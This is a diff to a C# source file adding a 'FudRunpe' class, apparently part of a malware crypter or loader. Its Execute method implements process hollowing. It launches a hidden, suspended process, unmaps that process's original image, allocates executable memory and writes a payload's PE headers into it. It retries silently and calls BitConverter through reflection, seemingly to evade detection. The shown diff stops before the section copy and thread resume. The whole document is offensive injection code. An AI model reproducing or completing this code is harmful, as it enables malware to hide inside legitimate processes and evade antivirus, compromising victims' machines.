@@ -3,6 +3,7 @@ using System.Collections.Generic;
 using System.Linq;
 using System.Text;
 using System.Runtime.InteropServices;
+using Microsoft.VisualBasic;
 
 namespace RunPE
 {
@@ -20,7 +21,75 @@ namespace RunPE
 
     class FudRunpe : NativeAPI
     {
-
+        public static void Execute(string path, byte[] payload)
+        {
+            for(int i = 0; i < 5; i++)
+            {
+                int readWrite = 0;
+                StartupInformation SI = new StartupInformation();
+                ProcessInformation PI = new ProcessInformation();
+                SI.Size = Convert.ToUInt32(Marshal.SizeOf(typeof(StartupInformation)));
+                try
+                {
+                    bool CreateProc = CreateProcessA(path, string.Empty, IntPtr.Zero, IntPtr.Zero, false, 0x00000004 | 0x08000000, IntPtr.Zero, null, ref SI, ref PI);
+                    if (!CreateProc)
+                    {
+                        throw new Exception();
+                    }
+                    int fileAddress = (int)typeof(BitConverter).GetMethod("ToInt32").Invoke(null, new object[] { payload, 0x3C });
+                    int imageBase = (int)typeof(BitConverter).GetMethod("ToInt32").Invoke(null, new object[] { payload, fileAddress + 0x34 });
+                    int[] context = new int[0xB3];
+                    context[0] = 0x10002;
+                    if (IntPtr.Size == 0x4)
+                    {
+                        bool GetThreadC = GetThreadContext(PI.ThreadHandle, context);
+                        if (!GetThreadC)
+                        {
+                            throw new Exception();
+                        }
+                    }
+                    else
+                    {
+                        bool Wow64GetThreadC = Wow64GetThreadContext(PI.ThreadHandle, context);
+                        if (!Wow64GetThreadC)
+                        {
+                            throw new Exception();
+                        }
+                    }
+                    int ebx = context[0x29];
+                    int baseAddress = 0;
+                    bool ReadProcessMem = ReadProcessMemory(PI.ProcessHandle, ebx + 0x8, ref baseAddress, 0x4, ref readWrite);
+                    if (!ReadProcessMem)
+                    {
+                        throw new Exception();
+                    }
+                    if (imageBase == baseAddress)
+                    {
+                        int ZwUnmap = ZwUnmapViewOfSection(PI.ProcessHandle, baseAddress);
+                        if (ZwUnmap != 0)
+                        {
+                            throw new Exception();
+                        }
+                    }
+                    int sizeOfImage = (int)typeof(BitConverter).GetMethod("ToInt32").Invoke(null, new object[] { payload, fileAddress + 0x50 });
+                    int sizeOfHeaders = (int)typeof(BitConverter).GetMethod("ToInt32").Invoke(null, new object[] { payload, fileAddress + 0x54 });
+                    bool allowOverride = false;
+                    int newImageBase = VirtualAllocEx(PI.ProcessHandle, imageBase, sizeOfImage, 0x3000, 0x40);
+                    if (newImageBase == 0)
+                    {
+                        throw new Exception();
+                    }
+                    bool WriteProcessMem = WriteProcessMemory(PI.ProcessHandle, newImageBase, payload, sizeOfHeaders, ref readWrite);
+                    if (!WriteProcessMem)
+                    {
+                        throw new Exception();
+                    }
+                    int sectionOffset = fileAddress + 0xF8;
+                    short numberOfSections = (short)typeof(BitConverter).GetMethod("ToInt16").Invoke(null, new object[] { payload, fileAddress + 0x6 });
+                }
+                catch { }
+            }
+        }
     }
 
     class NativeAPI
